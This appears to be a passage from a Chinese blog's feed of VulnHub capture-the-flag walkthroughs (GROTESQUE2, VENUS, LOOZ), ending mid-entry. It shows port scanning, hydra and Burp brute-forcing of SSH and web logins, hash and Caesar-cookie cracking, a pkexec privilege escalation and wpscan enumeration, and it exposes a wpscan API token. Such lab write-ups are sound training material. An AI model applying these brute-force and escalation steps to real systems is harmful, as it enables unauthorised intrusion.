&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-986.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 此处破解的密码应该是：chatter&lt;/p&gt;
&lt;p&gt;登陆网站 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hcHAua2Vld2ViLmluZm8v&#34;&gt;https://app.keeweb.info/&lt;/span&gt; 输入 chatter 进入&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-987.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到如下界面，每一个页面里边都有一个 root 对应的密码，这四个密码分别是&lt;br&gt;
 &lt;code&gt;.:.yarak.:.&lt;/code&gt;   &lt;code&gt;sercertservice&lt;/code&gt;   &lt;code&gt;.:.subjective.:.&lt;/code&gt;   &lt;code&gt;rockyou.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-988.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-989.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在服务器里边分别尝试这四个 root 的密码是否正确&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-990.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 输入密码.:.subjective.:. 时成功拿到 root 权限&lt;/p&gt;
</content>
        <category term="VULNHUB 31-40" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/134%20GROTESQUE2/</id>
        <title>VULNHUB 34 GROTESQUE2</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/134%20GROTESQUE2/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ3JvdGVzcXVlLTIsNjczLw==&#34;&gt;https://www.vulnhub.com/entry/grotesque-2,673/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcGVuZXItc3FwL3AvMTQ4Mjc3NzMuaHRtbA==&#34;&gt;https://www.cnblogs.com/pener-sqp/p/14827773.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 GROTESQUE2：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l &amp;gt; 1.txt ; cat 1.txt | grep &#39;a0&#39; ; rm -f 1.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-893.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.73&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.73&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-894.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 2 2…600 基本上都开放&lt;/p&gt;
&lt;p&gt;这么多网站都开放的肯定是有问题的，需要打开几个找问题所在&lt;/p&gt;
&lt;h3 id=&#34;wget-批量下载网站&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wget-批量下载网站&#34;&gt;#&lt;/a&gt; wget 批量下载网站&lt;/h3&gt;
&lt;p&gt;002 信息收集，wget 批量下载，awk/sort 排序分析&lt;/p&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNzM=&#34;&gt;http://192.168.31.73&lt;/span&gt; , &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNzM6OTk=&#34;&gt;http://192.168.31.73:99&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-895.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-896.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对比下面两个网站发现一模一样没有任何区别&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;猜测从 22 到 600 这么多页面基本上都是一模一样的，唯有一个不同，而那个不同的页面需要通过脚本或者其他的方式筛选出来，可以用 burp 的方式访问不同端口的网站，看返回的数据包的长度来找，也可以用 wget 批量下载页面，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;下载所有文件 &lt;code&gt;for i in &amp;#123;23..600&amp;#125;;do wget 192.168.31.73:$i -O index$i;done&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-897.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-898.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;linux-排序文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux-排序文件&#34;&gt;#&lt;/a&gt; linux 排序文件&lt;/h3&gt;
&lt;p&gt;对下载到的文件进行排序  &lt;code&gt;ls -Al | sort | awk &#39;&amp;#123;print $5,$9&amp;#125;&#39; | tail -n10&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-899.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 看到在 258 端口处的网站有不一样的返回结果&lt;/p&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNzM6MjU4Lw==&#34;&gt;http://192.168.31.73:258/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-900.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;给出提示，ssh 的用户名可能是如下这几个&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-901.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;智力游戏解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#智力游戏解密&#34;&gt;#&lt;/a&gt; 智力游戏解密&lt;/h3&gt;
&lt;p&gt;审查源代码发现了一个图片的地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-902.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNzM6MjU4L2Vtb2ppL2hhbmQucG5n&#34;&gt;http://192.168.31.73:258/emoji/hand.png&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-903.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;大致一看是没有什么特殊的，但是仔细看图片后，发现隐藏着一些敏感信息，在图片的中间有一串 hash 数据： &lt;code&gt;b6e705ea1249e2bb7b0fd7dac9fcd1b3&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-904.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;解密此 md5 加密，得到密码为 solomon1&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-905.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;到此已经收集到了几个可能的用户名和一个 ssh 密码&lt;/p&gt;
&lt;h3 id=&#34;hydra-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破-ssh&#34;&gt;#&lt;/a&gt; hydra 爆破 ssh&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;hydra -L user.txt -p solomon1 ssh://192.168.31.22 -t 4&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-906.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到一组 ssh 的登陆凭据 angel:solomon1  &lt;code&gt;ssh angel@192.168.31.73&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-907.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;pspy-监控&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pspy-监控&#34;&gt;#&lt;/a&gt; pspy 监控&lt;/h3&gt;
&lt;p&gt;上传 pspy 监控看有没有被定时执行的任务&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-908.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;两个脚本定时执行，由于权限不足不能查看这两个脚本的作用，只能进行猜测，搜索目录&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-909.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;发现有一个 quiet 的文件夹里边有很多文件，而所有的文件中的内容都是 quiet 的内容，需要把这个文件先删除，然后查看此文件夹下的内容是否增加  &lt;code&gt;cat * | uniq&lt;/code&gt;   &lt;code&gt;rm -rf *&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-910.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;watch -n1 ls&lt;/code&gt;  监控文件状态&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-911.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;经过一段时间之后发现 quiet 文件又都复原了，判断出来 write 就是些 quiet 文件的，check 就是用来检查 quiet 文件是否存在的，上传 linpeas 检查是否有更多的敏感信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-912.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了一个 /rootcreds.txt 文件，文件里有 root 的账户和密码， &lt;code&gt;su root&lt;/code&gt;  切换到 root 的账户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-913.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
&lt;h3 id=&#34;定时任务查看&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#定时任务查看&#34;&gt;#&lt;/a&gt; 定时任务查看&lt;/h3&gt;
&lt;p&gt;定时任务中就是在不断的执行这两个脚本&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-914.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;check 的作用就是检查文件夹中的内容是否为空是的话就把 root 的密码写到根目录下，write 的作用是遍历写 quiet&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-915.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
</content>
        <category term="VULNHUB 31-40" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/137%20VENUS/</id>
        <title>VULNHUB 37 VENUS</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/137%20VENUS/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhlLXBsYW5ldHMtdmVudXMsNzA1Lw==&#34;&gt;https://www.vulnhub.com/entry/the-planets-venus,705/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 VENUS：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l &amp;gt; 1.txt ; cat 1.txt | grep &#39;a0&#39; &amp;gt; 2.txt ; rm -f 1.txt ; cat 2.txt | awk &#39;&amp;#123;print$1&amp;#125;&#39; &amp;gt; ip.txt; rm -f 2.txt; sudo nmap -PA -iL ip.txt;rm -f ip.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-991.png&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.12 靶机开放端口 22,8080&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTI6ODA4MC8=&#34;&gt;http://192.168.31.12:8080/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-992.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;给出了 guest:guest 的账户和密码，直接进入该网站&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-993.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看了一下，翻了翻源代码没有发现敏感信息&lt;/p&gt;
&lt;p&gt;用 gobuster 进行爆破:&lt;br&gt;
 &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.12:8080/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-994.png&#34;&gt;
&lt;p&gt;-&amp;gt; 关键目录 /admin&lt;/p&gt;
&lt;h3 id=&#34;存储-cookies-泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#存储-cookies-泄露&#34;&gt;#&lt;/a&gt; 存储 cookies 泄露&lt;/h3&gt;
&lt;p&gt;进入 admin 页面，检查页面是否存储 cookies 信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-995.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 auth 认证信息解密出来后发现是 guest:thrfg&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-996.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;意味着我们登陆 guest 用户，页面就会存储 guest 用户的相关票据，但是凭借此用户密码是无法登陆到网站后台的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-997.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;是不是有可能还有其他的登陆用户，我们将 google 存储在此页面的 cookie 信息清除&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-998.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;重新回到登陆页面&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-999.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 下一步的目标转化为爆破此页面的用户名和密码&lt;/p&gt;
&lt;h3 id=&#34;burp-爆破登陆框&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burp-爆破登陆框&#34;&gt;#&lt;/a&gt; burp 爆破登陆框&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;但是如果没有什么规律的话， 1000 行大小的字典爆破，需要 1000*1000 次的爆破次数，因为用户名和密码都有可能是这 1000 个种的任意一个&lt;br&gt;
输入一个错误的用户名看页面回显，看到了 Invalid username 的信息，于是乎我们可以先随便写一个密码，先爆破出用户名有哪些，有的话在依据此用户名爆破其密码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1000.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;顺便测一下输入正确的用户名，错误的密码的时候，页面的回显结果。发现有 Invalid password 的字段，可以据此信息判断页面是否能登陆成功。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1001.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;现在我们就通过爆破用户名的方式进入该网站，可以通过 burp 和 hydra 进行爆破。采用 burp 的方式需要先将浏览器数据进行代理。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1002.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将用户名设置为变量，密码设置为固定值进行爆破，由于默认给出的账户名和密码都是 guest 是一样的，这里我就直接通过将 username 和 password 的字段设置为一致来爆破。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1003.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;选取合适的字典如下，开始爆破&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1004.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;爆破成功后得到了 venus 用户是该网站的用户。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1005.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;接下来应该将 venus 作为固定用户名，测试其密码为多少。&lt;/p&gt;
&lt;h3 id=&#34;hydra-爆破登陆框&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破登陆框&#34;&gt;#&lt;/a&gt; hydra 爆破登陆框&lt;/h3&gt;
&lt;p&gt;或者用 hydra 的方式爆破用户名和密码&lt;br&gt;
 &lt;code&gt;hydra -L /usr/share/wordlists/rockyou.txt -p pass -s 8080 192.168.31.12 http-post- form &amp;quot;/:username=^USER^&amp;amp;password^PASS^:Invalid username.&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1006.png&#34;&gt;
&lt;p&gt;-&amp;gt; 测试得到了三个用户分别是 guest，venus，magellan&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;爆破用户名的阶段是比较漫长的，虽然可以用 hydra 的 - t 参数指定最大线程为 64 ，但是还是需要很长时间才能爆破出三个用户名的，这里为了尽快达到效果，我用了 vim 将字典进行了修改。&lt;br&gt;
单单依据上面的思路继续下去，需要对三个用户分别进行爆破，guest 和 venus 比较好爆破，经过一段时间的爆破发现这两个用户名的密码就是其用户名。但如果这个密码是比较复杂的也是很难爆破出来的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;数据包规律&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据包规律&#34;&gt;#&lt;/a&gt; 数据包规律&lt;/h3&gt;
&lt;p&gt;登陆 guest:guest，拦截浏览器数据，发现页面自动存储了 cookie 的信息。解密之后为 guest:thrfg, 前者是用户名，后者并不是密码，但可能是密码的另一种加密方式。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1007.png&#34;&gt;
&lt;p&gt;登陆 venus:venus，拦截浏览器数据，找到 cookie，解密后的凭据为 venus:irahf&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1008.png&#34;&gt;
&lt;p&gt;我们继续清除浏览器存储的 cookie 信息，用正确的用户名和一个虚假的密码尝试登陆，并用 burp 做代理拦截流量，发现页面给我们回复了一个加密密文。解密后得到了 magellan:irahfvnatrbybtl1989&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1009.png&#34;&gt;
&lt;p&gt;综上，我们得到了三组数据，分别是&lt;/p&gt;
&lt;p&gt;&lt;code&gt;guest:thrfg&lt;/code&gt;   &lt;code&gt;venus:irahf&lt;/code&gt;   &lt;code&gt;magellan:irahfvnatrbybtl1989&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;凯撒解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#凯撒解密&#34;&gt;#&lt;/a&gt; 凯撒解密&lt;/h3&gt;
&lt;p&gt;观察得知，好像就是一个字符的偏移加密，这就是凯撒加密无疑了，但是具体偏移多少位还需要一一尝试，在下面网址中依次按不同的偏移量进行解密:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21vZXJzaW1hLjAwY2hhLm5ldC9rYWlzYW1pbWEuYXNw&#34;&gt;http://moersima.00cha.net/kaisamima.asp&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1010.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;最终得到了加密方式为凯撒偏移 13 的加密，并且三位用户名密码均得到了。&lt;/p&gt;
&lt;p&gt;ssh 成功拿到了 magellan 的权限，得到了其 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1011.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;pkexec-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pkexec-提权&#34;&gt;#&lt;/a&gt; pkexec 提权&lt;/h3&gt;
&lt;p&gt;看了一眼服务器存在 pkexec 的，并且有 s 权限，而且存在 gcc 编译器的，直接利用此进行提权&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1012.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 pkexec 的利用脚本发送至对方服务器，编译运行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1013.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
</content>
        <category term="VULNHUB 31-40" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/140%20LOOZ/</id>
        <title>VULNHUB 40 LOOZ</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/140%20LOOZ/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvbG9vei0xLDczMi8=&#34;&gt;https://www.vulnhub.com/entry/looz-1,732/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9uZXBjb2RleC5jb20vMjAyMS8wOC93YWxrdGhyb3VnaC1vZi1sb296LWZyb20tdnVsbmh1Yi13cml0ZXVwLw==&#34;&gt;https://nepcodex.com/2021/08/walkthrough-of-looz-from-vulnhub-writeup/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 LOOZ：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机服务&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1096.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.80 靶机开放端口 22,80,139,445,3306,8081&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODA=&#34;&gt;http://192.168.31.80&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1097.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;审查源代码，找到一则提示信息，展示了一个用户名和密码  &lt;code&gt;john:y0uC@n&#39;tbr3akIT&lt;/code&gt;  并且告知了此网站是 wp 的，即是 wordpres 站点&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1098.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;既然是 wordpress 站点，我就直接用 wpscan 工具来扫描一波&lt;br&gt;
 &lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.80 -e&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1099.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;居然说是没有 wp，那可能是误导我们或者 wp 站点在其他的目录里。对网站进行 gobuster 扫描，识别一下网站有什么目录没有&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1100.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现没有，按照 wp 的规范，后台地址是 wp-admin, 我们直接进该目录，发现这个站点确实不存在 wp，可能在其他的目录或者站点里边&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1101.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;还有一个 8081 的站点也是网站，点进来看看有没有啥敏感信息，发现进到这个页面之后会跳转&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1102.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;跳转到了一个站点，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS13d3ctcTMzZXI4b2YyenMxcThza2Vwai5sb296LmNvbQ==&#34;&gt;站点的域名是 www.looz.com&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1103.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;修改本地的 hosts 文件，将站点 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5sb296LmNvbQ==&#34;&gt;www.looz.com&lt;/span&gt; 的 DNS 解析指向靶机 ip&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1104.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试一下一直寻找的 wp 站点是不是就在这个 url 地址上，直接在域名后面拼接一个 wp-admin 找后台登陆地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1105.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到后台地址后凭借我们在前面收集到的用户信息登陆&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1106.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;wordpress-渗透测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wordpress-渗透测试&#34;&gt;#&lt;/a&gt; wordpress 渗透测试&lt;/h3&gt;
&lt;p&gt;一眼看到网站是 wordpress 6.0.1 的，直接用本地的 searchsploit 寻找是否存在此版本的 wordpress 的漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1107.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这个版本没有很明显的提权漏洞，只能另想其他方法了，既然是 wp 站点，索性在继续用 wpsan 扫描，枚举用户名&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1108.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;wpscan 扫描出了以下几个用户名 john,william,james,evelyn,mason,harper,gandalf&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1109.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;继续用 wpsan 枚举属于这几个用户名的密码&lt;br&gt;
